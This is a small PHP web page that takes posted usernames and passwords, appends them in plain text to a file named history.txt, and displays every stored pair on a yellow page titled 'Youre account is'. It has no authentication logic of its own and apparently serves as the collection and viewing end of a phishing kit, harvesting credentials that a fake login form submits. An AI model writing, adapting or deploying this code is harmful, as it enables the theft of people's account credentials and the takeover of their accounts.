<?php
$filename = 'history.txt';
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    $entry = "Username: $username, Password: $password\n";
    file_put_contents($filename, $entry, FILE_APPEND);
}
$history = file_get_contents($filename);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Youre account is</title>
    <link rel="icon" href="logo.png" type="image/png">
    <style>
        body {
            margin: 0;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background-color: #fff200;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            min-height: 100vh;
            padding: 20px;
        }

        h1 {
            font-weight: bold;
            color: #000;
            font-size: 32px;
            margin-bottom: 30px;
            text-align: center;
        }

        .history-entry {
            width: 100%;
            max-width: 400px;
            padding: 15px;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            margin-bottom: 15px;
            font-size: 18px;
            color: #333;
            text-align: left;
        }

        .username {
            font-weight: bold;
            color: #000;
        }

        .password {
            color: #666;
        }
    </style>
</head>
<body>
    <h1>youre account</h1>
    <?php
    $entries = explode("\n", trim($history));
    foreach ($entries as $entry) {
        if (!empty($entry)) {
            list($username, $password) = explode(", ", $entry);
            echo "<div class='history-entry'>";
            echo "<div class='username'>" . htmlspecialchars($username) . "</div>";
            echo "<div class='password'>" . htmlspecialchars($password) . "</div>";
            echo "</div>";
        }
    }
    ?>
</body>
</html>
